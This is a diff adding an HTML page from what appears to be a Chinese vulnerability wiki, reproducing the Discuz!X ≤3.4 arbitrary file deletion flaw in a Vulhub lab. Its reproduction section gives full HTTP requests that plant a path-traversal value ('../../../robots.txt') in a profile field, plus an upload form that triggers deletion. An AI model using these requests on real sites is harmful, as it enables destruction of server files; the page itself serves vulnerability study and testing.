@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X%20%E2%89%A43.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz!X ≤3.4 任意文件删除漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz!X \u22643.4 \u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21X3.4%20%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9UCenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21X3.4%20%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9UCenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz!X3.4 后台修改UCenter配置getshell漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz!X 3.4 admincp_setting.php 后台SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuzx-34">Discuz!X ≤3.4 任意文件删除漏洞<a class="headerlink" href="#discuzx-34" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>漏洞详情：<a href="https://lorexxar.cn/2017/09/30/dz-delete/">https://lorexxar.cn/2017/09/30/dz-delete/</a></p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Discuz!X ≤3.4
+</code></pre></div>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>Vulhub执行下列命令部署 Discuz!X 安装环境</p>
+<div class="highlight"><pre><span></span><code>docker-compose up -d
+</code></pre></div>
+<p>启动后，访问<code>http://your-ip/install/</code>来安装discuz，只用修改数据库地址为<code>db</code>，其他保持默认即可。</p>
+<p><img alt="image-20220222131339964" src="../images/202202221313350.png" /></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>访问<code>http://your-ip/robots.txt</code>可见robots.txt是存在的：</p>
+<p><img alt="image-20220222131412780" src="../images/202202221314844.png" /></p>
+<p>注册用户后，在个人设置页面找到自己的formhash：</p>
+<p><img alt="image-20220222131618637" src="../images/202202221316746.png" /></p>
+<p>带上自己的Cookie、formhash发送如下数据包：</p>
+<div class="highlight"><pre><span></span><code>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1
+Host: 192.168.174.128
+Content-Length: 370
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.174.128
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW8uA1wbCsmuiargU
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.174.128/home.php?mod=spacecp&amp;ac=profile&amp;op=base
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: AuthSession=dGhyZWVraTo2MjE0NEM0Mzrhe4V-bNxBqV-1RKA7mJS_YQrC9A; ot6_visitedfid=2; ot6_sid=9yWYy0; et56_2132_saltkey=qN7vqIdT; et56_2132_lastvisit=1645503280; et56_2132_sid=Ze005m; et56_2132_seccode=1.526c82122231460dd9; et56_2132_ulastactivity=6467KkrgcKDQNmUlDxKLd592a6DUvLlRSPU4g07eDld2bKtFo3JU; et56_2132_auth=45cdTg%2F0tTayn1c5i6fOd%2F96K8vGKx7SVg9MgaAoLalS102hICOtVzWjuDHbYtyyH8Rqe54O1WS9d%2Fa0s%2FIV; et56_2132_nofavfid=1; et56_2132_onlineusernum=1; et56_2132_noticeTitle=1; et56_2132_lastact=1645507206%09home.php%09misc
+Connection: close
+
+------WebKitFormBoundaryW8uA1wbCsmuiargU
+Content-Disposition: form-data; name=&quot;formhash&quot;
+
+d32e951d
+------WebKitFormBoundaryW8uA1wbCsmuiargU
+Content-Disposition: form-data; name=&quot;birthprovince&quot;
+
+../../../robots.txt
+------WebKitFormBoundaryW8uA1wbCsmuiargU
+Content-Disposition: form-data; name=&quot;profilesubmit&quot;
+
+true
+------WebKitFormBoundaryW8uA1wbCsmuiargU--
+</code></pre></div>
+<p><img alt="image-20220222132220237" src="../images/202202221322360.png" /></p>
+<p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：</p>
+<p><img alt="image-20220222132303344" src="../images/202202221323368.png" /></p>
+<p>说明我们的脏数据已经进入数据库了。</p>
+<p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p>
+<div class="highlight"><pre><span></span><code>&lt;body&gt;
+    &lt;form action=&quot;http://[your-ip]/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=[form-hash]&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+</code></pre></div>
+<p>用浏览器打开该页面，上传一个正常图片。如果遇到下图这样的情况，需要修改数据包。</p>
+<p><img alt="image-20220222143620386" src="../images/202202221436463.png" /></p>
+<p>Burpsuite抓包，将Refer和Cookie替换为正常上传数据包的值。</p>
+<div class="highlight"><pre><span></span><code>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=d32e951d HTTP/1.1
+Host: 192.168.174.222
+Content-Length: 3685
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.0.159
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKSoP7vDw487SX9LO
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: [替换为http://192.168.174.128/home.php?mod=spacecp]
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: [替换为正常上传的C]
+Connection: close
+</code></pre></div>
+<p>此时脏数据应该已被提取出，漏洞已经利用结束。</p>
+<p>再次访问<code>http://your-ip/robots.txt</code>，发现文件成功被删除。</p>
+<p><img alt="image-20220222145130066" src="../images/202202221451120.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21X3.4%20%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9UCenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21X3.4%20%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9UCenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz!X3.4 后台修改UCenter配置getshell漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz!X 3.4 admincp_setting.php 后台SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
